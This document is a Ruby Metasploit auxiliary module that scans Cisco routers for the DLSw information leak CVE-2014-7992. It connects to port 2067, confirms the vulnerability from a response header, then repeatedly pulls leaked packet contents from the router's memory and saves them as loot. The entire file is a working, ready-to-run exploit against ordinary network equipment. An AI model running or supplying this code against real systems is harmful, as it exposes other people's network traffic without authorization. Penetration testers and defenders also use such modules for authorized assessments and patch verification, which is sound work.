##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'socket'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'           => 'Cisco DLSw Information Leak Scanner',
      'Description'    => %q(
        This module implements the DLSw information leak retrieval. There is
        a bug in Cisco's DLSw implementation affecting 12.x and 15.x trains
        that allows an unuthenticated remote attacker to retrieve the partial
        contents of packets traversing a Cisco router with DLSw configured
        and active.
      ),
      'Author'         => [
        'Tate Hansen', # Vulnerability discovery
        'John McLeod', # Vulnerability discovery
        'Kyle Rainey' # Built lab to recreate vulnerability and help test
      ],
      'References'     =>
        [
          ['CVE', '2014-7992'],
          ['URL', 'https://github.com/tatehansen/dlsw_exploit']
        ],
      'DisclosureDate' => 'Nov 17 2014',
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(2067),
        OptInt.new('LEAK_AMOUNT', [true, 'The number of bytes to store before shutting down.', 1024]),
        OptInt.new('RESPONSE_TIMEOUT', [true, 'Number of seconds to wait for a server response', 5])
      ], self.class)
  end

  def peer
    peer = "#{rhost}:#{rport}"
  end

  def response_timeout
    datastore['RESPONSE_TIMEOUT']
  end

  # Called when using check
  def check_host(ip)
    print_status("Checking #{peer} for DLSw exposure")
    response = get_response

    dlsw_header = ["3148015b"].pack("H*") # => "\x31\x48\x01\x5b""
    if !response.blank? && (response[0..3] == dlsw_header)
      print_good("#{peer}: The target Cisco router appears vulnerable: parts of a Cisco IOS banner detected")
      report_vuln(
        host: rhost,
        port: rport,
        name: name,
        refs: references,
        info: "Module #{fullname} collected #{response.length} bytes"
      )
      Exploit::CheckCode::Vulnerable
    else
      if response.blank?
        vprint_status("#{peer}: no response")
      else
        vprint_status("#{peer}: #{response.size}-byte response didn't contain any leaked data")
      end
      Exploit::CheckCode::Safe
    end
  end

  def get_response(size = 1024)
    connect
    response = get_data(size)
    disconnect
    response
  end

  # Borrowed from https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb
  def get_data(length = -1)

    print_status("Calling get_response")
    return sock.get_once(-1, response_timeout) if length == -1

    to_receive = length
    data = ''
    while to_receive > 0
      temp = sock.get_once(to_receive, response_timeout)
      break if temp.nil?

      data << temp
      to_receive -= temp.length
    end
    data
  end

  # Main method
  def run_host(ip)
    return unless check_host(ip) == Exploit::CheckCode::Vulnerable

    print_status("#{peer}: Waiting for #{datastore['LEAK_AMOUNT']} bytes of leaked data")

    dlsw_data = ''
    until dlsw_data.length > datastore['LEAK_AMOUNT']
      response = get_response(72)
      unless response.blank?
        dlsw_data << response[18..72] # range of the leaked packet contents
      end
    end
    loot_and_report(dlsw_data)
  end

  def loot_and_report(dlsw_data)
    path = store_loot(
      'dlsw.packet.contents',
      'application/octet-stream',
      rhost,
      dlsw_data,
      'DLSw_leaked_data',
      'DLSw packet memory leak'
    )
    print_status("#{peer}: DLSw leaked data stored in #{path}")
  end
end
